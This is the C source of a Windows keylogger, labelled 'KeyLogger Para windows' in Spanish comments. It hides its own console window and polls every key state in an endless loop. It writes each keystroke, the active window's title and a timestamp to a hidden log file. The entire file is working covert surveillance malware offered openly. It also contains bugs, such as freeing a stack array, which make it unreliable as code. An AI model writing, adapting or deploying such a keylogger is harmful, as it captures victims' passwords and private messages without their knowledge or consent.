#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>

/*
KeyLogger Para windows
*/

#define OK -32767

int main(){
HWND ventana=GetForegroundWindow();
ShowWindow(ventana,SW_HIDE);
 {
    FILE *log;
    HWND ventana;
    time_t ltime;
    int tecla=0;
    int cont=0;
    char TVentana[500] = "";
    char Teclas[10240]=""; //      0  1      2          3          4  5          6  7  8              9       10
    char simbol[256][15] =/*0*/  {"","","[CliC-I]","[CliC-D]","","[CliC-C]","","","[Retroceder]","[TAB]","",
                          /*1*/      "","","[ENTER]","","","[SHIFT]","[CONTROL]","[ALT]","","[Mayusculas]",
                          /*2*/      "","","","","","","[Esc]","","","",
                          /*3*/      ""," ","[Re-Pag]","[Av-Pag]","","[Inicio]","[Izquierda]","[Arriba]","[Derecha]","[Abajo]",
                          /*4*/      "","","","[PrtSc]","[Insert]","[Supr]","","0","1","2",
                          /*5*/      "3","4","5","6","7","8","9","","","",
                          /*6*/      "","","","","a","b","c","d","e","f",
                          /*7*/      "g","h","i","j","k","l","m","n","o","p",
                          /*8*/      "q","r","s","t","u","v","w","x","y","z",
                          /*9*/      "[WIN-I]","[WIN-D]","[D-WIN]","","","0","1","2","3",
                          /*10*/     "4","5","6","7","8","9","*","+"," ","-",".",
                          /*11*/     "/","[F1]","[F2]","[F3]","[F4]","[F5]","[F6]","[F7]","[F8]","[F9]",
                          /*12*/     "[F10]","[F11]","[F12]"," "," "," "," "," "," "," ",
                          /*13*/     " "," "," "," "," "," "," "," "," "," "," ",
                          /*14*/     " "," ","[Bloq Num]"," "," "," "," "," "," ",
                          /*15*/     " "," "," "," "," "," "," "," "," ","[Shift-I]",
                          /*16*/     "[Shift-D]"," "," "," "," "," "," "," "," "," ",
                          /*17*/     " "," "," "," "," "," "," "," "," "," ",
                          /*18*/     " "," "," "," "," "," "," ",",","-",".",
                          /*19*/     " "," "," "," "," "," "," "," "," ",
                          /*20*/     " "," "," "," "," "," "," "," "," "," "," ",
                          /*21*/     " "," "," "," "," "," "," "," ","'","\\",
                          /*22*/     "¡","´" };

   log=fopen("log.log","a");
   fprintf(log,"\n/******************************/");
   fprintf(log,"\n/* [*]KeyLoGuer   */");
   fprintf(log,"\n/* [*]Iniciando...OK ");
   fprintf(log,"\n/******************************/");
   fclose(log);

   ventana=GetForegroundWindow();

   while(1) {
      if((GetForegroundWindow()!=ventana) || (cont==850)){
         if(strlen(TVentana)>0 && strlen(Teclas)>0) {
            time(&ltime);
            ctime(&ltime);

            log=fopen("log.log","a");
            fprintf(log,"\n\n[*] Fecha: %s",ctime(&ltime));
            fprintf(log,"[*] Ventana: %s ",TVentana);
            fprintf(log,"\n[*] Texto: %s",Teclas);
            fprintf(log,"\n ");
            fprintf(log,"\n/******************************/\n");
            fclose(log);

            free(Teclas);
            strcpy(Teclas,"");
            cont = 0;
            }
         ventana=GetForegroundWindow();
         }
      else {
           GetWindowText(ventana,TVentana,500);
           }
      for(tecla=4;tecla<256;tecla++) {
          if (GetAsyncKeyState(tecla)==OK) {
              strcat(Teclas,simbol[tecla]);
              printf(" %s \n" ,simbol[tecla]);
              cont++;
              }
          }
    }
}
}
